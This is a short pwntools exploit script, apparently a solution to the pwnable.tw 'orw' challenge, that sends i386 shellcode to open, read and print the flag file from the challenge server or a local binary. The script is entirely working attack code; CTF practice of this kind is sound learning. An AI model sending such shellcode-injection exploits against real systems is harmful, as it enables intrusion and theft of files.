#!/usr/bin/env python3
from pwn import *

context.binary = './orw'
context.os = 'linux'
context.arch = 'i386'
context.log_level = 'INFO'

if args.REMOTE:
    ip = 'chall.pwnable.tw'
    port = 10001
    p = remote(ip, port)
else:
    p = process()

shellcode = asm(shellcraft.open('/home/orw/flag') +
                shellcraft.read('eax', 'esp', 0x30) +
                shellcraft.write(1, 'esp', 0x30)
                )

p.recvuntil(':')
p.send(shellcode)

p.interactive()
